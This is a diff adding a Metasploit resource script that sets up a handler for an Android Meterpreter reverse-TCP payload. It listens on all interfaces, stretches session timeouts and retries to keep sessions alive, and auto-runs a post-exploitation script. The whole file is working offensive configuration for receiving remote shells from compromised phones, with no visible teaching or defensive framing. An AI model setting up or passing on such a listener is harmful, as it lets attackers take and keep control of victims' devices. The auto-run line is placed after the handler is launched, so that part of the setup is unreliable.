@@ -1,0 +1,25 @@
+# Advanced Handler Configuration for Persistent Payload
+# Created: 2025-11-22
+
+# Handler با تنظیمات Persistence
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+
+# Session Management - Extended timeouts for persistent sessions
+set ExitOnSession false
+set SessionCommunicationTimeout 600
+set SessionExpirationTimeout 1200
+set SessionRetryTotal 50
+set SessionRetryWait 5
+
+# Enable Stage Encoding
+set EnableStageEncoding true
+set StageEncoder generic/none
+
+# Start handler
+exploit -j -z
+
+# Auto-run script when session established
+set AutoRunScript "multi_console_command -r /root/post_exploit.rc"
